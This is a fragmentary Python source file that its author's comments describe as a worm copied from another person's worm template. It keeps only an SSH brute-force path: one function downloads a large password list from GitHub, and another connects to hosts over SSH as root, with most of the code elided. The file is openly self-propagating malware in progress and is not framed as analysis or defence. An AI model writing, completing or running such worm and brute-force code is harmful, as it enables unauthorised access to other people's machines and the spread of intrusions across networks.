...
#using pylyf's worm as template. Gonna copy it all down by hand and look up what everything does as I go to make sure I understand what is going on. 
#using the code from the other worm, but I deleted the FTP functions for now, just gonna focus on making the SSH bruteforce work
...
def download_ssh_passwords(filename):
    ...
    # - Gavin - added new password list containing many more
    ...
    url = "https://github.com/scipag/password-list/blob/main/overall/password-list-all.txt"
    urllib.request.urlretrieve(url, filename)
    logger.debug("Passwords downloaded!")

#- Gavin - Not using the FTP function for now
...
def connect_to_ssh(host, password):
    ...
    # -Gavin- Just going to use root for now, no need to add username
